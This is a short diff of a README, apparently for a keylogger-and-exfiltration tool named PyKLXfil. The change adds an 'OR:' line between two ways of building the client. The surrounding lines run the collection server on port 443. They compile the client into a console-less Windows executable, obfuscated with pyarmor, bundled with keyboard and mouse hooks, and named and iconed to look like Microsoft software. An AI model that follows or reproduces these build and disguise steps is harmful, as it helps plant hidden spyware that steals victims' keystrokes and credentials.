@@ -32,6 +32,7 @@ python3 PyKLXfil-Server.py 0.0.0.0 443 &
  pip3 install pyinstaller
  pyarmor pack --clean -e "--onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32" PyKLXfil-Client.py -n mscc.exe
  ```
+ OR:
  2. Compile the script to exe using pyinstaller:
 ```sh
 pyinstaller --onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 -n mscc.exe PyKLXfil-Client.py
